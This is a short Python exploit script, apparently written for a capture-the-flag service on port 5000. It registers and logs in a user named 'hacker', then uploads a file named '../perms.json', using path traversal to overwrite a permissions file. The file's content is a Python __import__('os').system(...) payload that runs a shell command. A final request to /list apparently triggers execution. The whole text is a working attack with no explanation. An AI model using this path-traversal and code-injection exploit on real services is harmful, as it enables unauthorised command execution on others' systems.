import requests
import sys
import re
import base64
import json
import hashlib

ip = sys.argv[1]

r = requests.post(f"http://{ip}:5000/register", data={ 'login': 'hacker', 'password': 'hacker' })

s = requests.Session()

s.post(f"http://{ip}:5000/login", data={ 'login': 'hacker', 'password': 'hacker' })

s.post(f"http://{ip}:5000/upload", files={ 
    'file': (
        "../perms.json",
        """__import__("os").system("echo 'hacked' > kek")"""
    )
})

s.get(f"http://{ip}:5000/list")